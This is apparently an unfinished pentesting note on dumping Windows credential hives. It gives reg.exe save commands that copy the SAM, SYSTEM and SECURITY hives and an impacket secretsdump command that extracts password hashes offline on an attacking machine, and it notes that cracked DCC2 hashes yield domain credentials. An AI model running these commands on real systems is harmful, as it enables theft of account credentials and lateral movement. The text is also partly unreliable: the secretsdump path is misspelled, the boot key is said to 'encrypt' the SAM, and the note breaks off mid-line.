---
tags: [basics, technique, windows, wip]
---



Important Registry Hives to drop
- HKLM\SAM -> Contains password hashes for local user account
- HKLM\SYSTEM -> Stores system boot key, which is required to encrypt the SAM database
- HKLM\SECURITY -> Sensitive inofrmation used by the Local Security Authority (LSA)

```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Move those *.save files over to your attacking machine and then dup the secrets using secretsdump 
python3 /usr/share/doc/python3-impacket/examples/secretsdump.y -sam sam.save -security security.save -system system.save LOCAL
```

The hklm\security ontains also cached domain logon information in the form of DCC2 hashes. Once cracked, they provide you netowkr credentials 
- Furtheron you find DPAPI 
